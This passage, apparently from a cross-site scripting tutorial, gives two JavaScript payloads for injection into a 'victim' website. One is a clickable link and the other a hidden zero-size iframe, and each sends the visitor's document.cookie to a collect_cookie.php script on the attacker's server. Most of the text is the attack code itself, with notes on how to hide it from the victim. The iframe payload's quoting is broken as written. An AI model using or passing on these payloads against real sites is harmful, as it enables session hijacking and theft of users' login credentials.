Here is the JavaScript code that we will inject into the victim server or browser.
  
We can inject any one of these scripts :
<a onclick="document.location='http://127.0.0.1/collect_cookie.php?
cookie='+escape(document.cookie);" href="#">Click here for Details</a>
this script need user interaction because it print a link to the user , if the user
clicks on that link ,the redirection to our site with the cookie information will be
Done.
  
<iframe width='0' height='0' frameborder='0'
src='<script>document.location='http://127.0.0.1/collect_cookie.php?
cookie='+escape(document.cookie);</script>' />
  
This script doesn't need user interaction ,here we will inject an iframe in the
victim website and it's hidden so the victim can't see that ,and the connection
will be done.
